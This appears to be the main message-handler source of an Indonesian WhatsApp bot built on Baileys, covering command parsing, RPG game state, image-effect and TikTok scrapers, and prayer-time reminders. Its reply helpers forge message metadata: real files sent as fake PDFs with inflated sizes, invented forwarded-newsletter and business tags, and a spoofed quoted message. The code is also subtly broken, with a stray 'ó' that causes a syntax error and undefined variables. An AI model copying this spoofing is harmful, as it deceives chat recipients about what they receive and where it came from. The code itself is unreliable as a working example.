/*
__________________________________________________

 * Base By Siputzx
 * Created On 22/2/2024
 * Contact Me on wa.me/6288292024190
 * Supported By Gpt Assistant 
 
  - Veemon Is Blue -
 
 • Base Remaked By ziyo
 • No Having Team For Ever
__________________________________________________

< Veemon > [ 1.6 ] >>> ADD LIST & FIX - PROJECT ()

SUPPORT BUTTON, ALL RESPON •
FITUR JADIBOT SCAN / NO SCAN •
PROJECT RPG •
BETON GESER / COPPY / BETON LIST •
TEMPORARY •
SCRAPE •
CREATE PANEL •
CREATE VPS •
GAME • 
DLL.. •

[ OTW REAL SERBA GUNA ]

< • = sudah >
___________________________________________________

*/
















require('./config')
const absenData = {}
const chalk = require("chalk")
const cfont = require("cfonts")
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const Remove = require('removebg-id');
const fg = require('api-dylux')
const emojiRegex = require('emoji-regex');
const { v4: uuidv4 } = require('uuid')
const { exec, spawn, execSync } = require("child_process")
const fsx = require('fs-extra')
const util = require('util')
const fetch = require('node-fetch')
const FormData = require('form-data')
const axios = require('axios')
const cheerio = require('cheerio')
const { performance } = require("perf_hooks");
const { TelegraPH } = require("./lib/TelegraPH")
const { remini, jarak, ssweb, tiktok, PlayStore, BukaLapak, pinterest, stickersearch, lirik, webp2mp4File } = require("./lib/scraper")
const process = require('process');
const moment = require("moment-timezone")
const os = require('os');
const checkDiskSpace = require('check-disk-space').default;
const speed = require('performance-now')
const more = String.fromCharCode(8206);
const readmore = more.repeat(4800)
const { jadibots, connss } = require("./jadibots")
const { jadibot, conns } = require("./jadibot")
const { addExif } = require('./lib/exif')
const fs = require("fs")
const { generateWAMessage, useMultiFileAuthState, areJidsSameUser, makeWaSocket, proto, downloadContentFromMessage, prepareWAMessageMedia, generateWAMessageFromContent, generateWAMessageContent} = require("@whiskeysockets/baileys")

const { bytesToSize, checkBandwidth, formatSize, jsonformat, nganuin, runtime, shorturl, formatp, color, getGroupAdmins } = require("./lib/myfunc");
const {
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    fetchBuffer,
    buffergif,
    totalcase
} = require('./system/myfunc')

module.exports = ptz = async (ptz, m, chatUpdate, store) => {
try {
const body = (m && m?.mtype) ? (
m?.mtype === 'conversation' ? m?.message?.conversation :
m?.mtype === 'imageMessage' ? m?.message?.imageMessage?.caption :
m?.mtype === 'videoMessage' ? m?.message?.videoMessage?.caption :
m?.mtype === 'extendedTextMessage' ? m?.message?.extendedTextMessage?.text :
m?.mtype === 'buttonsResponseMessage' ? m?.message.buttonsResponseMessage.selectedButtonId :
m?.mtype === 'listResponseMessage' ? m?.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
m?.mtype === 'interactiveResponseMessage' ? appenTextMessage(JSON.parse(m?.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) :
m?.mtype === 'templateButtonReplyMessage' ? appenTextMessage(m?.msg.selectedId, chatUpdate) :
m?.mtype === 'messageContextInfo' ? (m?.message.buttonsResponseMessage?.selectedButtonId || m?.message.listResponseMessage?.singleSelectReply.selectedRowId || m?.text) :
    ''
) : '';
 async function appenTextMessage(text, chatUpdate) {
        let messages = await generateWAMessage(m?.chat, { text: text, mentions: m?.mentionedJid }, {
            userJid: ptz.user.id,
            quoted:m?.quoted && m?.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m?.sender, ptz.user.id)
        messages.key.id = m?.key.id
        messages.pushName = m?.pushName
        if (m?.isGroup) messages.participant = m?.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'}
ptz.ev.emit('messages.upsert', msg)}       
 /*const body = (
    m?.mtype === 'conversation' ? m?.message.conversation :
    m?.mtype === 'imageMessage' ? m?.message.imageMessage.caption :
    m?.mtype === 'videoMessage' ? m?.message.videoMessage.caption :
    m?.mtype === 'extendedTextMessage' ? m?.message.extendedTextMessage.text :
    m?.mtype === 'buttonsResponseMessage' ? m?.message.buttonsResponseMessage.selectedButtonId :
    m?.mtype === 'listResponseMessage' ? m?.message.listResponseMessage.singleSelectReply.selectedRowId :
    m?.mtype === 'templateButtonReplyMessage' ? m?.message.templateButtonReplyMessage.selectedId :
    m?.mtype === 'interactiveResponseMessage' ? appenTextMessage(JSON.parse(m?.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) :
    m?.mtype === 'templateButtonReplyMessage' ? appenTextMessage(m?.msg.selectedId, chatUpdate) :
    m?.mtype === 'messageContextInfo' ? (m?.message.buttonsResponseMessage?.selectedButtonId || m?.message.listResponseMessage?.singleSelectReply.selectedRowId || m?.text) :
    ''
);   */
const budy = (m && typeof m?.text === 'string') ? m?.text : '';
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1);
const full_args = body.replace(command, '').slice(1).trim();
const pushname = m?.pushName || "No Name";
const botNumber = await ptz.decodeJid(ptz.user.id);

const newowner = JSON.parse(fs.readFileSync('./database/owner.json'))

const isCreator = (m && m?.sender && [botNumber, ...newowner,...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m?.sender)) || false;
const isPrivate = m?.fromMe || m?.author == null;    
const itsMe = (m && m?.sender && m?.sender == botNumber) || false;
const text = q = args.join(" ");
const frommeky = m.key.remoteJid  
const from = m.key.remoteJid  
const fatkuns = m && (m?.quoted || m);
const quoted = (fatkuns?.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
(fatkuns?.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
(fatkuns?.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] :
m?.quoted || m;
const mime = ((quoted?.msg || quoted) || {}).mimetype || '';
const qmsg = (quoted?.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
//group
const groupMetadata = m?.isGroup ? await ptz.groupMetadata(m?.chat).catch(e => {}) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? await groupMetadata.participants || [] : [];
const groupAdmins = m?.isGroup ? await getGroupAdmins(participants) || [] : [];
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m?.sender) : false;
const groupOwner = m?.isGroup ? groupMetadata.owner || '' : '';
const isGroupOwner = m?.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m?.sender) : false;
const isGroup = m.key.remoteJid.endsWith('@g.us')
//================== [ TIME ] ==================//
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')

        if(time2 < "23:59:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴏʀᴇ'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱɪᴀɴɢ️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴜʙᴜʜ'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
        }
//================== [ DATABASE ] ==================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.data.users[m?.sender]
if (typeof user !== 'object') global.db.data.users[m?.sender] = {}
if (user) {
} else global.db.data.users[m?.sender] = {
}

 let chats = global.db.data.chats[m?.chat]
 if (typeof chats !== 'object') global.db.data.chats[m?.chat] = {}
 if (chats) {
 if (!('isBanned' in chat)) chat.isBanned = false
 } else global.db.data.chats[m?.chat] = {
 isBanned: false,
}

let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
 if (!('autoread' in setting)) setting.autoread = false
if (!("public" in settings)) settings.public = true
if (!('setmenu' in setting)) setting.setmenu = 1
if (!('setreply' in setting)) setting.setreply = 1
} else global.db.data.settings[botNumber] = {
 autoread: false,
 public: true,
 setmenu: 1,
 setreply: 1,
}
} catch (err) {
}

const userdb = global.db.data.users[m.sender]
const chatdb = global.db.data.chats[m.chat]
//================== [ DATABASE ] ==================//



    //===== [ SCRAPE ] =====//
    const { queryString } = require('object-query-string')
const photoOxy = (url, text) => new Promise((resolve, reject) => {
  axios({
    method: 'GET',
    url: url,
    headers: {
      'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36'
    }
  })
  .then(({ data, headers }) => {
    const token = /<input type="hidden" name="token" value="(.*?)" id="token">/.exec(data)[1]
    const build_server = /<input type="hidden" name="build_server" value="(.*?)" id="build_server">/.exec(data)[1]
    const build_server_id = /<input type="hidden" name="build_server_id" value="(.*?)" id="build_server_id">/.exec(data)[1]
    const cookie = headers['set-cookie'][0]
    const form = new FormData()
    if (typeof text === 'string') text = [text]
    for (let texts of text) form.append('text[]', texts)
    form.append('sumbit', 'GO')
    form.append('token', token)
    form.append('build_server', build_server)
    form.append('build_server_id', build_server_id)
    axios({
      method: 'POST',
      url: url,
      data: form,
      headers: {
        'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
        'cookie': cookie,
        ...form.getHeaders()
      }
    })
    .then(({ data }) => {
      const form_value = /<div.*?id = "form_value".+>(.*?)<\/div>/.exec(data)[1]
      axios({
        method: 'GET',
        url: 'https://photooxy.com/effect/create-image?' + queryString(JSON.parse(form_value)),
        headers: {
          'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
          'cookie': cookie
        }
      })
      .then(({ data }) => {
        resolve(build_server + data.image)
      })
      .catch(reject)
    })
    .catch(reject)
  })
  .catch(reject)
})
async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          'user-agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $('input[name=token]').val();
      let build_server = $('input[name=build_server]').val();
      let build_server_id = $('input[name=build_server_id]').val();
      form.append('text[]', text);
      form.append('token', token);
      form.append('build_server', build_server);
      form.append('build_server_id', build_server_id);
      let res = await axios({
        url: url,
        method: 'POST',
        data: form,
        headers: {
          Accept: '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'user-agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
          cookie: gT.headers['set-cookie']?.join('; '),
          ...form.getHeaders(),
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$('input[name=form_value_input]').val());
      json['text[]'] = json.text;
      delete json.text;
      let { data } = await axios.post(
        'https://en.ephoto360.com/effect/create-image',
        new URLSearchParams(json),
        {
          headers: {
            'user-agent':
              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
            cookie: gT.headers['set-cookie'].join('; '),
          },
        }
      );
      return build_server + data.image;
    }















    //====== //
    const prem = JSON.parse(fs.readFileSync("./database/premium.json"))
    const rimraf = require('rimraf')
    const fitur = () =>{
            var mytext = fs.readFileSync("./message.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
//================== [ FUNC ] ==================//
if ((m?.chat in global.db.data.chats || m?.sender in global.db.data.users)) {
let chat = global.db.data.chats[m?.chat]
if (chat && chat.isBanned && !isCreator) return
}
const userId = m.sender

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

if (body.match(`@${global.owner.split("@")[0]}`)) {
      m.reply('*`[ SYSTEM ]`* Mau Ngapain tag Owner Ku ?')
}

if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }


    let m2 = "`"

const tektek = `╭────────────────────•
│ *‎${m2}</> - I N F O - B O T - </>${m2}*
╭────────────────────•
│  •  Bot Name : Veemon - Md
│  •  Version : 1.6
│️  •  Baileys : whiskeysockets
╰────────────────────•
 ‎ ∨ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴀɪᴍᴇɴᴜ  
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴠᴏɪᴄᴇᴍᴇɴᴜ  
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴅᴏᴍᴇɴᴜ 
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴀʙꜱᴇɴᴍᴇɴᴜ  
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴀʟʟᴍᴇɴᴜ       
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ʀᴘɢᴍᴇɴᴜ
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴍᴇɴᴜ  
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ɢʀᴏᴜᴘᴍᴇɴᴜ
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴍᴀɪɴᴍᴇɴᴜ
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴛᴏᴏʟꜱᴍᴇɴᴜ
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴘʜᴏᴛᴏᴏxʏᴍᴇɴᴜ      
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴇᴘʜᴏᴛᴏᴍᴇɴᴜ
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ꜱᴛɪᴄᴋᴇʀᴍᴇɴᴜ 
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴛᴇᴍᴘᴏʀᴍᴇɴᴜ
 ‎ ꕤ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴏᴡɴᴇʀᴍᴇɴᴜ
•────────────────────•`
const used = process.memoryUsage();
const cpus = os.cpus().map((cpu) => {
cpu.total = Object.keys(cpu.times).reduce(
(last, type) => last + cpu.times[type],
0,
);
return cpu;
});
const cpu = cpus.reduce(
(last, cpu, _, { length }) => {
last.total += cpu.total;
last.speed += cpu.speed / length;
last.times.user += cpu.times.user;
last.times.nice += cpu.times.nice;
last.times.sys += cpu.times.sys;
last.times.idle += cpu.times.idle;
last.times.irq += cpu.times.irq;
return last;
},
{
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0,
},
},
);

var date = new Date();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var ram = `${formatSize(process.memoryUsage().heapUsed)} / ${formatSize(os.totalmem)}`;
var cpuuuu = os.cpus();
var sisaram = `${Math.round(os.freemem)}`;
var totalram = `${Math.round(os.totalmem)}`;
var persenram = (sisaram / totalram) * 100;
var persenramm = 100 - persenram;
var ramused = totalram - sisaram;

var space = await checkDiskSpace(process.cwd());
var freespace = `${Math.round(space.free)}`;
var totalspace = `${Math.round(space.size)}`;
var diskused = totalspace - freespace;
var neww = performance.now();
var oldd = performance.now();
let timestamp = speed();
let latensi = speed() - timestamp;
var { download, upload } = await checkBandwidth();

//=======// Rpg

          
           const { addtoken, gettoken, kurangtoken } = require("./src/alat_tukar.js")    
        const istoken = gettoken(m?.sender)
        
const { addInventoriDarah,  cekDuluJoinAdaApaKagaDiJson,  addDarah,  kurangDarah, getDarah }= require('./src/darah.js')
const { cekInventoryAdaAtauGak,  addInventori, addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi, getEmas, getEmerald, getUmpan, getPotion, addMahkota, KurangMahkota, getMahkota,} = require('./src/alat_tukar.js')
const {  addInventoriMonay,  cekDuluJoinAdaApaKagaMonaynyaDiJson,  addMonay,  kurangMonay, getMonay, } = require('./src/monay.js')
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, /*getLimit*/ } = require('./src/limit.js')
let _petualang = JSON.parse(fs.readFileSync('./src/inventory.json'))
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam,  addKelinci,  addDomba,  addSapi, addGajah, kurangIkan, kurangAyam,  kurangKelinci,  kurangDomba,  kurangSapi, kurangGajah, getIkan, getAyam,  getKelinci, getDomba,getSapi, getGajah } = require('./src/buruan.js')
const { getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,addATM,addKoinUser,checkATMuser,getMancingIkan,getMancingId,addMancingId,jualIkan,addPlanet,getBertualangPlanet,getPlaneId,addPlaneId,jualbahankimia,addCoal,getMiningcoal,getMiningId,addMiningId,jualcoal,addStone,getMiningstone,getBatuId,addBatuId,jualstone,addOre,getMiningore,getOreId,addOreId,jualore,addIngot,getMiningingot,getIngotId,addIngotId,jualingot,addKayu,getNebangKayu,getNebangId,addNebangId,jualKayu, checkPetualangUser, addDm, sellDm, getDm} = require('./rpg.js')
let DarahAwal = global.rpg.darahawal
const ikan = ['🐳','🐟','🐠']
let _buruan = JSON.parse(fs.readFileSync('./src/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./src/darah.json'))
let hit = JSON.parse(fs.readFileSync('./src/total-hit-user.json')ó)

// energy 
const { addInventorienergy,  cekDuluJoinAdaApaKagaDiJsonenergy,  addenergy, kurangenergy, getenergy }= require('./src/energy.js')
let energyAwal =global.rpg.energyawal
let _energyOrg = JSON.parse(fs.readFileSync('./src/energy.json'))
const isenergy = cekDuluJoinAdaApaKagaDiJsonenergy(m?.sender)
const isCekenergy = getenergy(m?.sender)
const isDarah = cekDuluJoinAdaApaKagaDiJsonenergy(m?.sender)
const isCekDarah = getDarah(m?.sender)
const isUmpan = getUmpan(m?.sender)
const isPotion = getPotion(m?.sender)
const isIkan = getIkan(m?.sender)
const isAyam = getAyam(m?.sender)
const isKelinci = getKelinci(m?.sender)
const isDomba = getDomba(m?.sender)
const isSapi = getSapi(m?.sender)
const isGajah = getGajah(m?.sender)
const isMonay = getMonay(m?.sender)
//const isLimit = getLimit(m.sender)
const isBesi = getBesi(m?.sender)
const isEmas = getEmas(m?.sender)
const isEmerald = getEmerald(m?.sender)
const isPetualang = checkPetualangUser(m?.sender)
const isInventory = cekInventoryAdaAtauGak(m?.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m?.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m?.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m?.sender)
const chatId = m.chat;
    
    const isUserRegistered = (userId) => {
            const data = fs.readFileSync('./Rpg/join.json', 'utf8');
            const users = JSON.parse(data);
            return users.some(user => user.id === userId);
        };
    const ckusrjoin = m.sender
const JSON_FILE_PATH = './Rpg/gacha_result.json';
    const { addCho, kurangCho, getCho } = require('./src/alat_tukar.js')
const isCho = getCho(m?.sender)
//==========//

// Pemberitahuan system
ptz.autoshalat = ptz.autoshalat ? ptz.autoshalat : {};
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? ptz.user.id : m.sender;
let id = m.chat;
if (id in ptz.autoshalat) {
return false;
}
let jadwalSholat = {
shubuh: "04:29",
terbit: "05:44",
dhuha: "06:02",
dzuhur: "12:02",
ashar: "15:15",
magrib: "17:52",
isya: "19:01",
};
const datek = new Date(
new Date().toLocaleString("en-US", {
timeZone: "Asia/Jakarta",}),
);
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
if (timeNow === waktu) {
let caption = `*[ Hai kak ${pushname} ]*\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat\n\n*>> ${waktu} <<*\n*untuk wilayah Bandung dan sekitarnya.*`;
ptz.autoshalat[id] = [
m?.reply(caption),
setTimeout(async () => {
delete ptz.autoshalat[m.chat];
}, 57000),];
}}
const numbers = ['595976154279@s.whatsapp.net', '595984317697@s.whatsapp.net']
 let currentIndex = 0
    const cron = require('node-cron')
    /*cron.schedule("0 0 5 * * *", () => {
ptz.sendMessage(m.chat, { text : '*`<!> Bangun-bangun, sudah subuh mari kita beraktivitas`*\n\n[ Pemberitahuan Sholat-2 ]', mentions: participants.map(a => a.id)})
}, {scheduled: true, timezone: "Asia/Jakarta"});

cron.schedule('0 0 22 * * *', async () => {
const getGroups = await ptz.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*`<!> Hellow Group otomatis di tutup\nSekarang saatnya tidur 😴*`'
if (groups.some(v => v === frommeky) && !(await ptz.groupMetadata(frommeky)).announce) {
ptz.groupSettingUpdate(frommeky, 'announcement').then(() => ptz.sendMessage(frommeky, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 6 * * *', async () => {
const getGroups = await ptz.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let texct = '*`<!> Hellow Group otomatis di buka lagi\nSemoga Semua sehat selalu 🤗*`'
if (groups.some(v => v === frommeky) && (await ptz.groupMetadata(frommeky)).announce) {
ptz.groupSettingUpdate(frommeky, 'not_announcement');
ptz.sendMessage(frommeky, {text: texct, mentions: Object.values(global.db.groups[frommeky].member).map(v => v.id)}, {ephemeralExpiration: m.expiration});
ptz.groupRequestParticipantsList(frommeky).then(async (data) => {
if (data.length === 0) return
for (let i of data) {
await ptz.groupRequestParticipantsUpdate(frommeky, [i.jid], 'approve')
await sleep(2300)
}
})
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })*/
    // ========= //
if (isCmd) {
userdb.hitcmd += 1
}

const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363294187887035@newsletter',
    newsletterName: '',
    caption: body
}}}
    async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m?.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./system/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./system/command.json',JSON.stringify(_db, null, 2));
}
}
    async function loading () {
var loding = [
 '*•~- `【 ▬▬4859e80x1a79u 】` -~•*',
 '*•~- `【 ▬▬▬859e80x1a79u 】` -~•*',
 '*•~- `【 ▬▬▬▬▬9e80x1a79u 】` -~•*',
 '*•~- `【 ▬▬▬▬▬▬▬▬1a79u 】` -~•*',
 '*•~- `【 ▬▬▬▬▬▬▬▬▬▬▬ 】` -~•*',
 '*•~- `【 ▬▬▬[ AWAIT ]▬▬▬ 】` -~•*'
]
let { key } = await ptz.sendMessage(frommeky, {text: '*•~- `【 ▬x1633e0ao1ae34 】` -~•*'})

for (let i = 0; i < loding.length; i++) {
/*await sleep(1000)*/
await ptz.sendMessage(frommeky, {text: loding[i], edit: key });
}
/* setTimeout (async  () => {
reply('*•~- `【 ▬▬▬[ AWAIT ]▬▬▬ 】` -~•*')*/
}
  /*  const reply = async(teks) => {
    ptz.sendMessage(m.chat, {
                        document: {
                           url: 'https://telegra.ph/file/93741c67607500e8138e9.jpg'
                        },
                        caption: teks,
                        mimetype: 'application/pdf',
                        fileName: "Veemon bot • 2024",
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: "Veemon - MULTI DEVICE",
                                body: "© Ziyo official ",
                                thumbnail: fs.readFileSync('./thum.jpg'),
                                sourceUrl: "https://ẉ.ceo/ziyoo-pemula",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fsaluran
                    })
}*/


    const reply = async(teks) => {
    if (global.setreply === "v1") {
 ptz.sendMessage(m.chat, {
            document: fs.readFileSync("./package.json"),
           fileName: '❃ VEEMON MD - FDOC',
           fileLength: 99999999999999,
            mimetype: 'application/pdf',
           jpegThumbnail:fs.readFileSync("./thum.jpg"),
            caption: "\n" + teks,
  contextInfo: {
       showAdAttribution: true,
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: `595972980943@s.whatsapp.net`
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363294187887035@newsletter',
            serverMessageId: null,
            newsletterName: '- Vemon • Chanels -'
        }
    }
}, { quoted: fsaluran,ephemeralExpiration: 86400});
} else if (global.setreply === "v2") {
m.reply(teks)
} if (global.setreply === "v3") {
ptz.sendMessage(m.chat, {text:teks})
} if (global.setreply === "v4") {
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `Veemon - MD`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: `https://whatsapp.com/channel/0029VaiskcuGJP8O84HwJu0y`,}
}, text: teks}, { quoted: m })
}
}
//$$$$//
    
    
    const randomNomor = async(ext) => {
    return `${Math.floor(Math.random() * 10000)}${ext}`
}
    
    const replym = async(teks, url, fotern) => {
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./package.json"),
fileName: '❃ VEEMON MD - ' + fotern,
mimetype: 'application/pdf',
jpegThumbnail:fs.readFileSync("./thum.jpg"),
caption: `\n${teks}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: '⟡V E E M O N • M U L T I • D E V I C E⟡',
body: `© Ziyo Official - 2024` ,
thumbnailUrl: url,
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: true 
}}}, { quoted: fsaluran,ephemeralExpiration: 86400});
    }
    
const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./system/register.js')
const isRegistered = checkRegisteredUser(m?.sender)

async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}

//=====// Anti
 // Anti Link
  const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase() 
  const ntilink = JSON.parse(fs.readFileSync("./database/antilinkgc.json"))
const AntiLink = m.isGroup ? ntilink.includes(m.chat) : false 
const BadWor = JSON.parse(fs.readFileSync('./database/bad.json'))   
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));     
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));    
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
